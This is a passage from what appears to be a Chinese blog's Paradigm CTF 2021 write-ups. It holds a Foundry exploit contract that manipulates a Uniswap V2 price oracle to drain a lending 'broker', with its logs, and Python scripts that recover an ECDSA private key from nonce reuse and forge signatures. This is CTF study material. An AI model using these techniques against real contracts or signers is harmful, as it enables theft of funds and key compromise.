SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/04.broker/Setup.sol&quot;;</span><br><span class="line">import &quot;./uniswapV2/erc20.sol&quot;;</span><br><span class="line">import &quot;./uniswapV2/factory.sol&quot;;</span><br><span class="line">import &quot;./uniswapV2/pair.sol&quot;;</span><br><span class="line">import &quot;./uniswapV2/router.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    string constant weth9_Artifact = &#x27;out/helper_WETH9.sol/WETH9.json&#x27;;</span><br><span class="line"></span><br><span class="line">    Setup public level;</span><br><span class="line">    IWETH9 public weth;</span><br><span class="line">    Broker public broker;</span><br><span class="line"></span><br><span class="line">    // uniswapV2系统</span><br><span class="line">    Iu_factory u_factory;</span><br><span class="line">    Iu_router u_router;</span><br><span class="line">    Token Ltoken;</span><br><span class="line">    IPair pair;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // 创建WETH9合约</span><br><span class="line">        weth = IWETH9(deployHelper_weth(weth9_Artifact));</span><br><span class="line">        vm.label(address(weth), &quot;weth&quot;);</span><br><span class="line"></span><br><span class="line">        // 创建uniswapV2系统</span><br><span class="line"></span><br><span class="line">        // 部署u_factory</span><br><span class="line">        u_factory = Iu_factory(deployHelper_u_factory());</span><br><span class="line">        vm.label(address(u_factory), &quot;u_factory&quot;);</span><br><span class="line"></span><br><span class="line">        // 部署u_router</span><br><span class="line">        u_router = Iu_router(deployHelper_u_router(address(u_factory), address(weth)));</span><br><span class="line">        vm.label(address(u_router), &quot;u_router&quot;);</span><br><span class="line">        </span><br><span class="line">        // 初始化题目合约</span><br><span class="line">        level = new Setup&#123;value: 50 ether&#125;(address(weth), address(u_factory));</span><br><span class="line">        vm.label(address(level), &quot;level&quot;);</span><br><span class="line"></span><br><span class="line">        broker = level.broker();</span><br><span class="line">        vm.label(address(broker), &quot;broker&quot;);</span><br><span class="line">        Ltoken = level.token();</span><br><span class="line">        vm.label(address(Ltoken), &quot;Ltoken&quot;);</span><br><span class="line"></span><br><span class="line">        // 标记pair</span><br><span class="line">        pair = IPair(pairFor(address(u_factory), address(Ltoken), address(weth)));</span><br><span class="line">        vm.label(address(pair), &quot;pair&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public payable&#123;</span><br><span class="line">        </span><br><span class="line">        // 获得一些WETH，用来在池子里swap</span><br><span class="line">        uint256 amount_WETH = 25 ether;</span><br><span class="line">        weth.deposit&#123;value: amount_WETH&#125;();</span><br><span class="line"></span><br><span class="line">        console.log(&quot;==========before attack=========&quot;);</span><br><span class="line">        (uint112 reserve0_before, uint112 reserve1_before , uint32 z ) = pair.getReserves();</span><br><span class="line">        console.log(&quot;the pool&quot;);</span><br><span class="line">        console.log(&quot;   reserve0_WETH_before&quot;,reserve0_before);</span><br><span class="line">        console.log(&quot;   reserve1_Ltoken_before&quot;,reserve1_before);</span><br><span class="line">        console.log(&quot;My asset&quot;);</span><br><span class="line">        console.log(&quot;   WETH&quot;, weth.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;   Ltoken&quot;, Ltoken.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;WETH price&quot;, broker.rate());</span><br><span class="line">        console.log(&quot;liquidate&#x27;s WETH price 15000&quot;);</span><br><span class="line">        console.log(&quot;broker&#x27;s WETH&quot;, weth.balanceOf(address(broker)));</span><br><span class="line"></span><br><span class="line">        // 准备</span><br><span class="line">        weth.approve(address(broker), type(uint256).max);</span><br><span class="line">        weth.approve(address(u_router), type(uint256).max);</span><br><span class="line">        Ltoken.approve(address(broker), type(uint256).max);</span><br><span class="line">        Ltoken.approve(address(u_router), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        // 把WETH换成Ltoken</span><br><span class="line">        address[] memory path = new address[](2);</span><br><span class="line">path[0] = address(weth);</span><br><span class="line">path[1] = address(Ltoken);</span><br><span class="line">u_router.swapExactTokensForTokens(amount_WETH, 0, path, address(this), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        console.log();</span><br><span class="line">        console.log(&quot;======after swap 25WETH for Ltoken======&quot;);</span><br><span class="line">        (uint112 reserve0_afterSwap, uint112 reserve1_afterSwap , uint32 zx ) = pair.getReserves();</span><br><span class="line">        console.log(&quot;the pool&quot;);</span><br><span class="line">        console.log(&quot;   reserve0_WETH_after&quot;,reserve0_afterSwap);</span><br><span class="line">        console.log(&quot;   reserve1_Ltoken_after&quot;,reserve1_afterSwap);</span><br><span class="line">        console.log(&quot;My asset&quot;);</span><br><span class="line">        console.log(&quot;   WETH&quot;, weth.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;   Ltoken&quot;, Ltoken.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;WETH price&quot;,broker.rate());</span><br><span class="line">        console.log(&quot;broker&#x27;s WETH&quot;,weth.balanceOf(address(broker)));</span><br><span class="line"></span><br><span class="line">        // 开始清算</span><br><span class="line">        uint amount_liquidate = 24 ether * broker.rate();</span><br><span class="line">        broker.liquidate(address(level), amount_liquidate);</span><br><span class="line"></span><br><span class="line">        console.log();</span><br><span class="line">        console.log(&quot;==========after liquidate=========&quot;);</span><br><span class="line">        (uint112 reserve0_afterLiquidate, uint112 reserve1_afterLiquidate , uint32 zzz ) = pair.getReserves();</span><br><span class="line">        console.log(&quot;the pool&quot;);</span><br><span class="line">        console.log(&quot;   reserve0_WETH_after&quot;,reserve0_afterLiquidate);</span><br><span class="line">        console.log(&quot;   reserve1_Ltoken_after&quot;,reserve1_afterLiquidate);</span><br><span class="line">        console.log(&quot;My asset&quot;);</span><br><span class="line">        console.log(&quot;   WETH&quot;, weth.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;   Ltoken&quot;, Ltoken.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;WETH price&quot;,broker.rate());</span><br><span class="line">        console.log(&quot;broker&#x27;s WETH&quot;,weth.balanceOf(address(broker)));</span><br><span class="line">        </span><br><span class="line">        assertEq(level.isSolved(), true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123;</span><br><span class="line">        (address token0, address token1) = sortTokens(tokenA, tokenB);</span><br><span class="line">        </span><br><span class="line">        pair = address(uint160(uint256(keccak256(abi.encodePacked(</span><br><span class="line">                hex&#x27;ff&#x27;,</span><br><span class="line">                factory,</span><br><span class="line">                keccak256(abi.encodePacked(token0, token1)),</span><br><span class="line">                // 这个是我编译出来的bytecode的哈希值</span><br><span class="line">                hex&#x27;f0e60e1779ec5ef88ad36bab3e3e0cad28189353ab5bf1f719a2855de1c74e52&#x27; // init code hash</span><br><span class="line">            )))));</span><br><span class="line">    &#125;</span><br><span class="line">    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) &#123;</span><br><span class="line">        require(tokenA != tokenB, &#x27;UniswapV2Library: IDENTICAL_ADDRESSES&#x27;);</span><br><span class="line">        (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">        require(token0 != address(0), &#x27;UniswapV2Library: ZERO_ADDRESS&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署WETH</span><br><span class="line">    function deployHelper_weth(string memory what) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = vm.getCode(what);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署u_ERC20</span><br><span class="line">    function deployHelper_u_ERC20() public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = BYTECODE_erc20;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署u_factory</span><br><span class="line">    function deployHelper_u_factory() public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = BYTECODE_factory;</span><br><span class="line">        // 构造器有参数</span><br><span class="line">        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode, abi.encode(address(msg.sender)));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署u_router</span><br><span class="line">    function deployHelper_u_router(address _u_factory, address _weth) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = BYTECODE_router;</span><br><span class="line">        // 构造器有参数</span><br><span class="line">        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode, abi.encode(address(_u_factory), address(_weth)));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">E:.</span><br><span class="line">│  attackTest.sol</span><br><span class="line">│  helper_WETH9.sol</span><br><span class="line">│  interface.sol</span><br><span class="line">│  </span><br><span class="line">└─uniswapV2</span><br><span class="line">        erc20.sol</span><br><span class="line">        factory.sol</span><br><span class="line">        pair.sol</span><br><span class="line">        router.sol</span><br></pre></td></tr></table></figure><p>输出结果：一开始的25WETH是自己存的，后面的24WETH是broker发给我的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Logs:</span><br><span class="line">  ==========before attack=========</span><br><span class="line">  the pool</span><br><span class="line">     reserve0_WETH_before 25000000000000000000</span><br><span class="line">     reserve1_Ltoken_before 500000000000000000000000</span><br><span class="line">  My asset</span><br><span class="line">     WETH 25000000000000000000</span><br><span class="line">     Ltoken 0</span><br><span class="line">  WETH price 20000</span><br><span class="line">  liquidate<span class="string">&#x27;s WETH price 15000</span></span><br><span class="line"><span class="string">  broker&#x27;</span>s WETH 25000000000000000000</span><br><span class="line"></span><br><span class="line">  ======after swap 25WETH <span class="keyword">for</span> Ltoken======</span><br><span class="line">  the pool</span><br><span class="line">     reserve0_WETH_after 50000000000000000000</span><br><span class="line">     reserve1_Ltoken_after 250375563345017526289435</span><br><span class="line">  My asset</span><br><span class="line">     WETH 0</span><br><span class="line">     Ltoken 249624436654982473710565</span><br><span class="line">  WETH price 5007</span><br><span class="line">  broker<span class="string">&#x27;s WETH 25000000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  ==========after liquidate=========</span></span><br><span class="line"><span class="string">  the pool</span></span><br><span class="line"><span class="string">     reserve0_WETH_after 50000000000000000000</span></span><br><span class="line"><span class="string">     reserve1_Ltoken_after 250375563345017526289435</span></span><br><span class="line"><span class="string">  My asset</span></span><br><span class="line"><span class="string">     WETH 24000000000000000000</span></span><br><span class="line"><span class="string">     Ltoken 129456436654982473710565</span></span><br><span class="line"><span class="string">  WETH price 5007</span></span><br><span class="line"><span class="string">  broker&#x27;</span>s WETH 1000000000000000000</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 19.Paradigm CTF 2021 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.babycrypto</title>
      <link href="/2023/09/18/19.Paradigm%20CTF%202021/03.babycrypto/"/>
      <url>/2023/09/18/19.Paradigm%20CTF%202021/03.babycrypto/</url>
      
        <content type="html"><![CDATA[<h1 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>只有一个python文件和依赖，因为需要用到sha3，也就是pysha3库，因此用python3.5</p><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义生成密钥对的函数 : 这个函数生成一个 ECDSA 密钥对，其中包括私钥 priv 和对应的公钥 pub</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_keypair</span>() -&gt; <span class="type">Tuple</span>[ecdsa.Private_key, ecdsa.Public_key]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    generate a new ecdsa keypair</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 选择椭圆曲线参数 secp256k1</span></span><br><span class="line">    g = ecdsa.generator_secp256k1</span><br><span class="line">    <span class="comment"># 随机生成私钥 d，范围在 [1, g.order()) 内</span></span><br><span class="line">    d = SystemRandom().randrange(<span class="number">1</span>, g.order())</span><br><span class="line">    <span class="comment"># 计算公钥 pub = g * d</span></span><br><span class="line">    pub = ecdsa.Public_key(g, g * d)</span><br><span class="line">    priv = ecdsa.Private_key(pub, d)</span><br><span class="line">    <span class="keyword">return</span> priv, pub</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义生成会话密钥的函数: 这个函数生成一个随机的 32 字节会话密钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_session_secret</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    generate a random 32 byte session secret</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 使用 /dev/urandom 生成随机数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> rnd:</span><br><span class="line">        seed1 = <span class="built_in">int</span>(binascii.hexlify(rnd.read(<span class="number">32</span>)), <span class="number">16</span>)</span><br><span class="line">        seed2 = <span class="built_in">int</span>(binascii.hexlify(rnd.read(<span class="number">32</span>)), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> seed1 ^ seed2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义哈希消息的函数: 这个函数将输入的字符串消息哈希为一个整数，用于签名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_message</span>(<span class="params">msg: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    hash the message using keccak256, truncate if necessary</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    k = sha3.keccak_256()</span><br><span class="line">    k.update(msg.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    d = k.digest()</span><br><span class="line">    n = <span class="built_in">int</span>(binascii.hexlify(d), <span class="number">16</span>)</span><br><span class="line">    olen = ecdsa.generator_secp256k1.order().bit_length() <span class="keyword">or</span> <span class="number">1</span></span><br><span class="line">    dlen = <span class="built_in">len</span>(d)</span><br><span class="line">    n &gt;&gt;= <span class="built_in">max</span>(<span class="number">0</span>, dlen - olen)</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 获取标志信息或设置默认标志</span></span><br><span class="line">    <span class="comment"># 这里获取环境变量中的 FLAG 值作为标志信息，如果环境变量中没有设置，则使用默认的占位标志</span></span><br><span class="line">    flag = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;PCTF&#123;placeholder&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成 ECDSA 密钥对和会话密钥</span></span><br><span class="line">    <span class="comment"># 通过调用之前定义的 gen_keypair() 函数生成 ECDSA 密钥对，然后调用 gen_session_secret() 函数生成会话密钥。</span></span><br><span class="line">    priv, pub = gen_keypair()</span><br><span class="line">    session_secret = gen_session_secret()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在这个循环中，程序四次要求用户输入消息，然后对消息进行哈希处理。</span></span><br><span class="line">    <span class="comment"># 接着，使用 priv.sign() 方法对哈希值进行签名，其中 priv 是之前生成的私钥，</span></span><br><span class="line">    <span class="comment"># session_secret 是会话密钥。签名后，程序打印出签名的 r 和 s 值。</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        message = <span class="built_in">input</span>(<span class="string">&quot;message? &quot;</span>)</span><br><span class="line">        hashed = hash_message(message)</span><br><span class="line">        sig = priv.sign(hashed, session_secret)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;r=0x<span class="subst">&#123;sig.r:032x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;s=0x<span class="subst">&#123;sig.s:032x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成测试哈希值并验证签名</span></span><br><span class="line">    <span class="comment"># 首先，程序生成一个随机的测试哈希值并打印出来。然后，程序等待用户输入 r 和 s 值。</span></span><br><span class="line">    test = hash_message(uuid.uuid4().<span class="built_in">hex</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;test=0x<span class="subst">&#123;test:032x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;r? &quot;</span>), <span class="number">16</span>)</span><br><span class="line">    s = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;s? &quot;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 程序使用公钥 pub 对测试哈希值进行验证，检查用户输入的签名是否有效。</span></span><br><span class="line">    <span class="comment"># 如果验证失败，程序输出一条失败消息并退出</span></span><br><span class="line">    <span class="comment"># 这就意味着，我们需要获得产生这个公钥的私钥，然后拿这个私钥签名一个信息（就是这里的test）</span></span><br><span class="line">    <span class="comment"># 获得这个信息的r和s</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pub.verifies(test, ecdsa.Signature(r, s)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;better luck next time&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>任务是：提供r和s，然后对信息test进行验签成功。</p><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>想要验签成功，就必须拿到私钥，然后对test进行签名才能拿到正确的r和s，问题是我们没有私钥。</p><p>没有思路的时候，就随便跑一下程序，发现无论输入什么message，输出的r都是一样的</p><p>问题就出来了，r相同导致私钥泄露，和capturetheether<a href="https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/15.Account%20Takeover/">这题</a>原理一样。</p><h4 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h4><p>因此，我们可以通过相同的r来还原出私钥（似乎下面的脚本无法根据相同的r还原出私钥，但是可以签名信息，但也是用相同的私钥签名的）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_message</span>(<span class="params">msg: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    hash the message using keccak256, truncate if necessary</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    k = sha3.keccak_256()</span><br><span class="line">    k.update(msg.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    d = k.digest()</span><br><span class="line">    n = <span class="built_in">int</span>(binascii.hexlify(d), <span class="number">16</span>)</span><br><span class="line">    olen = ecdsa.generator_secp256k1.order().bit_length() <span class="keyword">or</span> <span class="number">1</span></span><br><span class="line">    dlen = <span class="built_in">len</span>(d)</span><br><span class="line">    n &gt;&gt;= <span class="built_in">max</span>(<span class="number">0</span>, dlen - olen)</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modInverse</span>(<span class="params">b,m</span>):</span><br><span class="line">  g = math.gcd(b, m)</span><br><span class="line">  <span class="keyword">if</span> (g != <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(b, m - <span class="number">2</span>, m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to compute a/b under modulo m</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modDivide</span>(<span class="params">a,b,m</span>):</span><br><span class="line">  a = a % m</span><br><span class="line">  inv = modInverse(b,m)</span><br><span class="line">  <span class="keyword">if</span>(inv == -<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Division not defined&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> (inv*a) % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    msg1 = <span class="built_in">input</span>(<span class="string">&quot;message_01: &quot;</span>)</span><br><span class="line">    msg1_hashed = hash_message(msg1)</span><br><span class="line">    msg2 = <span class="built_in">input</span>(<span class="string">&quot;message_02: &quot;</span>)</span><br><span class="line">    msg2_hashed = hash_message(msg2)</span><br><span class="line">    r1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;message_01_r1: &quot;</span>), <span class="number">16</span>)</span><br><span class="line">    s1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;message_01_s1: &quot;</span>), <span class="number">16</span>)</span><br><span class="line">    s2 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;message_02_rs: &quot;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    g = ecdsa.generator_secp256k1</span><br><span class="line">    n = g.order()</span><br><span class="line"></span><br><span class="line">    k = modDivide((msg1_hashed - msg2_hashed), (s1 - s2), n)</span><br><span class="line"></span><br><span class="line">    d = modDivide(((s1 * k) - msg1_hashed), r1, n)</span><br><span class="line"></span><br><span class="line">    test = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;your message&#x27;s hash to sign: &quot;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    pub = ecdsa.Public_key(g, g * d)</span><br><span class="line">    priv = ecdsa.Private_key(pub, d)</span><br><span class="line"></span><br><span class="line">    sig = priv.sign(test, k)</span><br><span class="line">    <span class="comment"># 将结果输出为16进制</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;your message&#x27;s r=0x&#123;:032x&#125;&quot;</span>.<span class="built_in">format</span>(sig.r))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;your message&#x27;s s=0x&#123;:032x&#125;&quot;</span>.<span class="built_in">format</span>(sig.s))</span><br></pre></td></tr></table></figure><h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h4><p>通过下面的脚本，可以获得私钥，然后再用私钥进行签名，然后得到r和s即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span 